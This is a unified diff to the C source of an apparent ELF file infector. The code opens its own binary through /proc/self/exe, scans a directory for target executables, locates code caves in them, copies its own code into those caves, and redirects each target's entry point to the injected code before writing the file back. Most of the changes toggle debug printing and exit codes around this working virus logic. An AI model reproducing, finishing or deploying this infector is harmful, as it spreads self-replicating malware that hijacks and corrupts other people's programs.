@@ -74,7 +74,7 @@ __attribute__((always_inline)) inline void print_number_hex(uint64_t num);
 __attribute__((always_inline)) inline int ft_strlen(volatile char *str);
 __attribute__((always_inline)) inline void ft_strncpy(volatile char *src, volatile char *dst, size_t size);
 __attribute__((always_inline)) inline int ft_strstr(volatile char *haystack, volatile char *needle, size_t size);
-__attribute__((always_inline)) inline int ft_memcpy(volatile void *src, volatile void *dst, uint64_t size);
+__attribute__((always_inline)) inline void ft_memcpy(volatile void *src, volatile void *dst, uint64_t size);
 
 #ifdef TESTING
 int
@@ -83,14 +83,9 @@ main(void) {
 void
 _start() {
 #endif
-    ft_exit(88);
-    __attribute__((section(".text"))) volatile static char infect_test[] = "./in";
-    int fd_in = ft_open(infect_test, O_RDONLY, 0);
-    if (fd_in < 0) infected = 1;
-
-    volatile char path_self[] = {'/', 'p', 'r', 'o', 'c', '/', 's', 'e', 'l', 'f', '/', 'e', 'x', 'e', '\0'};
-    ft_write(1, path_self, ft_strlen(path_self));
-    if (infected) ft_exit(33);
+    __attribute__((section(".text"))) volatile static char path_self[] = "/proc/self/exe";
+    // int fd_in = ft_open(infect_test, O_RDONLY, 0);
+    // if (fd_in < 0) infected = 1;
 
     int fd_self = ft_open(path_self, O_RDONLY, 0);
     if (fd_self < 0) ft_exit(1);
@@ -104,7 +99,7 @@ _start() {
     __attribute__((section(".text"))) volatile static char dir0[] = "./a";
     if (infect_dir(dir0, &file_self)) ft_exit(1);
 
-    ft_exit(0);
+    ft_exit(112);
 }
 
 __attribute__((always_inline)) inline int
@@ -160,6 +155,14 @@ infect_file(volatile char *path, volatile file *file_self) {
 
     volatile code_cave code_caves_target[100];
     uint64_t code_caves_target_num = code_caves_get(code_caves_target, &file_target);
+    // for (int i = 0; i < code_caves_target_num; i++) {
+    //     char nl = '\n';
+    //     print_number_hex(code_caves_target[i].start);
+    //     ft_write(1, &nl, 1);
+    //     print_number_hex(code_caves_target[i].size);
+    //     ft_write(1, &nl, 1);
+    //     ft_write(1, &nl, 1);
+    // }
 
     volatile Elf64_Ehdr *header_self = file_self->mem;
     void *builder_self_start = file_self->mem + addr_to_offset(file_self, header_self->e_entry);
@@ -173,10 +176,10 @@ infect_file(volatile char *path, volatile file *file_self) {
     volatile entry *entries_self = file_self->mem + *builder_self_table_start;
     uint64_t entries_self_num = *builder_self_table_size;
 
-    print_number(entries_self[0].start);
-    ft_write(1, &nl, 1);
-    print_number(entries_self[0].size);
-    ft_write(1, &nl, 1);
+    // print_number(entries_self[0].start);
+    // ft_write(1, &nl, 1);
+    // print_number(entries_self[0].size);
+    // ft_write(1, &nl, 1);
 
     uint64_t provided_space = code_caves_size_sum(code_caves_target, code_caves_target_num);
     uint64_t needed_space_table = code_caves_target_num * 16;
@@ -218,36 +221,41 @@ infect_file(volatile char *path, volatile file *file_self) {
     *target_scaffold_num = scaffold_target_size;
 
     header_target->e_entry = offset_to_addr(&file_target, builder_target_start_offset);
-
-    char index = 'i';
-    for (int i = 0; i < scaffold_target_size; i++) {
-
-        ft_write(1, &index, 1);
-        ft_write(1, &nl, 1);
-        print_number(i);
-        ft_write(1, &nl, 1);
-        print_number_hex(*(uint64_t *)(file_target.mem + scaffolt_target_start_offset + i * 16));
-        ft_write(1, &nl, 1);
-        print_number_hex(*(uint64_t *)(file_target.mem + scaffolt_target_start_offset + i * 16 + 8));
-
-        ft_write(1, &nl, 1);
-    }
-    ft_write(1, &nl, 1);
-    ft_write(1, &nl, 1);
-    ft_write(1, &nl, 1);
-    print_number_hex(scaffolt_target_start_offset);
-    ft_write(1, &nl, 1);
-    print_number_hex(scaffold_target_size);
-    ft_write(1, &nl, 1);
-    char c = 'a';
-    ft_write(1, &c, 1);
-    ft_write(1, &c, 1);
-    ft_write(1, &c, 1);
-    ft_write(1, &c, 1);
-    ft_write(1, &c, 1);
-    ft_write(1, &c, 1);
-    ft_write(1, &nl, 1);
-    file_write(fd_target, &file_target);
+    // TODO: check if all stuff is put into the correct places
+    if (file_write(fd_target, &file_target)) ft_exit(44);
+    // char index = 'i';
+    // for (int i = 0; i < scaffold_target_size; i++) {
+    //
+    //     ft_write(1, &index, 1);
+    //     ft_write(1, &nl, 1);
+    //     print_number(i);
+    //     ft_write(1, &nl, 1);
+    //     print_number_hex(*(uint64_t *)(file_target.mem + scaffolt_target_start_offset + i * 16));
+    //     ft_write(1, &nl, 1);
+    //     print_number_hex(*(uint64_t *)(file_target.mem + scaffolt_target_start_offset + i * 16 + 8));
+    //
+    //
+    //     ft_write(1, &nl, 1);
+    //     ft_write(1, &nl, 1);
+    // }
+    // ft_write(1, &nl, 1);
+    // ft_write(1, &nl, 1);
+    // ft_write(1, &nl, 1);
+    // print_number_hex(scaffolt_target_start_offset);
+    // ft_write(1, &nl, 1);
+    // print_number_hex(scaffold_target_size);
+    // ft_write(1, &nl, 1);
+    // print_number_hex(builder_target_start_offset);
+    // ft_write(1, &nl, 1);
+    // char c = 'a';
+    // ft_write(1, &c, 1);
+    // ft_write(1, &c, 1);
+    // ft_write(1, &c, 1);
+    // ft_write(1, &c, 1);
+    // ft_write(1, &c, 1);
+    // ft_write(1, &c, 1);
+    // ft_write(1, &nl, 1);
+    // file_write(fd_target, &file_target);
     // header_target->e_entry
     // uint64_t builder_start_offset = write_builder(code_caves, num, fd_self, fd, builder_start, builder_size);
     // uint64_t destination_scaffold_table_offset = builder_start_offset + builder_size - 8;
@@ -319,16 +327,48 @@ copy_entries_into_code_caves(volatile entry *entries_target, volatile entry *ent
         volatile code_cave *cave = code_caves_target + cave_index;
         volatile entry *entry_target = entries_target + cave_index;
         entry_target->start = cave->start;
-
         while (cave->size > 0) {
+
             volatile entry *entry_self = entries_self + entry_self_index;
+
+            char nl = '\n';
+            char zero = '-';
+            ft_write(1, &nl, 1);
+            ft_write(1, &nl, 1);
+            ft_write(1, &nl, 1);
+            ft_write(1, &zero, 1);
+            ft_write(1, &nl, 1);
+            print_number_hex(cave->start);
+            ft_write(1, &nl, 1);
+            print_number_hex(cave->size);
+            ft_write(1, &nl, 1);
+            print_number_hex(cave_index);
+            ft_write(1, &nl, 1);
+
+            print_number_hex(entry_self->start);
+            ft_write(1, &nl, 1);
+            print_number_hex(entry_self->size);
+            ft_write(1, &nl, 1);
+            print_number_hex(entry_self_index);
+            ft_write(1, &nl, 1);
+            print_number_hex(entries_self_num);
+            ft_write(1, &nl, 1);
+            ft_write(1, &nl, 1);
             if (cave->size >= entry_self->size) {
+                char nl = '\n';
+                char one = '1';
+                ft_write(1, &one, 1);
+                ft_write(1, &nl, 1);
                 ft_memcpy(file_self->mem + entry_self->start, file_target->mem + cave->start, entry_self->size);
                 cave->start += entry_self->size;
                 cave->size -= entry_self->size;
                 entry_target += entry_self->size;
                 entry_self_index++;
             } else {
+                char nl = '\n';
+                char two = '2';
+                ft_write(1, &two, 1);
+                ft_write(1, &nl, 1);
                 uint64_t to_be_copied_bytes = cave->size;
                 ft_memcpy(file_self->mem + entry_self->start, file_target->mem + cave->start, to_be_copied_bytes);
                 entry_self->start += to_be_copied_bytes;
@@ -347,9 +387,11 @@ reserve_scaffol_table(volatile file *file_target, volatile code_cave *code_caves
     for (int i = 0; i < code_caves_target_num; i++) {
         volatile code_cave *cave = code_caves_target + i;
         if (cave->size >= code_caves_target_num * 16) {
+            // for (int j = 0; j < code_caves_target_num * 16; j++)
+            //     ((char *)file_target->mem + cave->start)[j] = 0;
             cave->start += code_caves_target_num * 16;
             cave->size -= code_caves_target_num * 16;
-            return cave->start - code_caves_target_num * 16;
+            return cave->start - (code_caves_target_num * 16);
         }
     }
     return 0;
@@ -372,7 +414,7 @@ reserve_builder(volatile file *file_target, volatile void *builder_self_start, v
     return 0;
 }
 
-__attribute__((always_inline)) inline int
+__attribute__((always_inline)) inline void
 ft_memcpy(volatile void *src, volatile void *dst, uint64_t size) {
     volatile char *src_c = src;
     volatile char *dst_c = dst;
